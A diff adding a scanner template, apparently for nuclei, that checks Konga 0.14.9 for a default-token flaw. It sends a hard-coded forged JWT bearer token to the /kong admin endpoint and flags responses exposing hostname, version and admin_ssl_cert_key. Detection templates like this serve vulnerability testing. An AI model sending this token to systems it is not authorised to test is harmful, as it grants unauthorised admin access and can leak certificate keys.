@@ -1,0 +1,28 @@
+id: Konga-default-login
+info:
+  author: Str1am
+  name: "Konga 0.14.9 \u7248\u672C\u9ED8\u8BA4\u53E3\u4EE4\u6F0F\u6D1E"
+  reference: https://github.com/pantsel/konga/blob/57f40d45108341eb57b7360cd01e8288e619747f/api/services/Token.js
+  severity: high
+  tags: Konga,login
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - hostname
+    - version
+    - admin_ssl_cert_key
+  matchers-condition: and
+  raw:
+  - 'GET /kong HTTP/1.1
+
+    Host: {{Hostname}}
+
+    authorization: Bearer eyJhbGciOiJIUzI1NiJ9.MQ.Lu-KcR4aCeuT9hi1K474zV3s4VaopLDCcf4nZvH6DQo
+
+    '
